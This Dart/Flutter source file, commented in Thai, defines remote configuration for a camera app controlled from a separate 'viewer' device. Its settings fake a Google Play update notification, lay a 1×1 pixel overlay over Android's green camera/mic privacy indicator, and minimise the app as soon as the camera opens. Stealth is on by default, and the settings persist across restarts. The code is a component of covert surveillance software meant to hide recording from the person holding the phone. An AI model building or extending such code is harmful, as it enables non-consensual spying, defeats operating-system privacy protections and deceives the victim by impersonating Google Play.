import 'package:shared_preferences/shared_preferences.dart';

/// Remote config ที่ viewer (เครื่องแม่) ส่งมาคุมพฤติกรรมกล้อง
/// - notifTitle/Body: ข้อความใน foreground service notification (ปลอม Google Play)
/// - stealthOverlay: เปิด overlay 1×1 px ทับจุดเขียว camera/mic (AirDroid technique)
/// - autoMinimize: ย่อ activity ทันทีหลังเปิดกล้อง
class CameraConfig {
  const CameraConfig({
    required this.notifTitle,
    required this.notifBody,
    required this.stealthOverlay,
    required this.autoMinimize,
  });

  final String notifTitle;
  final String notifBody;
  final bool stealthOverlay;
  final bool autoMinimize;

  static const CameraConfig defaults = CameraConfig(
    notifTitle: 'กำลังอัพเดท Google Play',
    notifBody: 'กำลังตรวจสอบและดาวน์โหลดข้อมูลล่าสุด',
    stealthOverlay: true,
    autoMinimize: true,
  );

  factory CameraConfig.fromJson(Map<String, dynamic> json) => CameraConfig(
        notifTitle: json['notifTitle'] as String? ?? defaults.notifTitle,
        notifBody: json['notifBody'] as String? ?? defaults.notifBody,
        stealthOverlay: json['stealthOverlay'] as bool? ?? defaults.stealthOverlay,
        autoMinimize: json['autoMinimize'] as bool? ?? defaults.autoMinimize,
      );

  Map<String, dynamic> toJson() => <String, dynamic>{
        'notifTitle': notifTitle,
        'notifBody': notifBody,
        'stealthOverlay': stealthOverlay,
        'autoMinimize': autoMinimize,
      };

  CameraConfig copyWith({
    String? notifTitle,
    String? notifBody,
    bool? stealthOverlay,
    bool? autoMinimize,
  }) =>
      CameraConfig(
        notifTitle: notifTitle ?? this.notifTitle,
        notifBody: notifBody ?? this.notifBody,
        stealthOverlay: stealthOverlay ?? this.stealthOverlay,
        autoMinimize: autoMinimize ?? this.autoMinimize,
      );
}

/// SharedPreferences wrapper — เก็บ config ที่ viewer push มาล่าสุด
/// ใช้ตอน restart app: โหลด config จาก disk แทนรอ server push ใหม่
class CameraConfigStore {
  static const _kTitle = 'cfg_notif_title';
  static const _kBody = 'cfg_notif_body';
  static const _kStealth = 'cfg_stealth_overlay';
  static const _kAutoMin = 'cfg_auto_minimize';

  static Future<CameraConfig> load() async {
    final prefs = await SharedPreferences.getInstance();
    return CameraConfig(
      notifTitle: prefs.getString(_kTitle) ?? CameraConfig.defaults.notifTitle,
      notifBody: prefs.getString(_kBody) ?? CameraConfig.defaults.notifBody,
      stealthOverlay:
          prefs.getBool(_kStealth) ?? CameraConfig.defaults.stealthOverlay,
      autoMinimize:
          prefs.getBool(_kAutoMin) ?? CameraConfig.defaults.autoMinimize,
    );
  }

  static Future<void> save(CameraConfig config) async {
    final prefs = await SharedPreferences.getInstance();
    await prefs.setString(_kTitle, config.notifTitle);
    await prefs.setString(_kBody, config.notifBody);
    await prefs.setBool(_kStealth, config.stealthOverlay);
    await prefs.setBool(_kAutoMin, config.autoMinimize);
  }
}
